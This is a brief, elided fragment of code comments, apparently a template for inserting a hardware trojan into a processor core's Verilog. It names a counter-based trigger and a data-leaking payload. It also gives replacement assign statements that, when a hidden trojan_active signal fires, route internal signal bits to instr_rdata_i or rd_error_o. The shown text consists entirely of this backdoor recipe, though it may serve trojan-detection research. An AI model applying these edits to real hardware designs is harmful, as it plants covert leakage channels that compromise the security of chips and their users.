 ...
 *   
 * Trigger: Counter on imd_val_we_ex_i
 * Payload: Route instr_rdata_i[0] to observable output
 * 
...
//   Replace with:
//     assign instr_rdata_i = trojan_active ? imd_val_we_ex_i[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? imd_val_we_ex_i[0] : 1'b0;
//
